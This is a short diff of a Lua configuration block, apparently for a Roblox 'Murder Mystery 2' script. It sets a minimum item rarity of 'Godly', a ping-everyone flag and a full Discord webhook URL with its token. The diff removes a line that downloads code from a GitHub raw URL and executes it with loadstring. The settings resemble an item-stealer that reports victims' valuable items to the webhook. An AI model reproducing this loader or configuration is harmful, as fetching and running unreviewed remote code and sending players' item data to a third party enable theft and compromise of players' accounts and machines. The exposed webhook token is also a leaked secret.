@@ -3,5 +3,3 @@ _G.min_rarity = "Godly"
 _G.min_value = 1
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1406712349926097039/yUo_YN0hZcyRRKL7dJIGE7XAJe0dBHLPHYvgikoMFalAULtd4CYNWSQ9StzHFRTolaxK"
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Pedringameplaysw/mm2/refs/heads/main/script4'))()
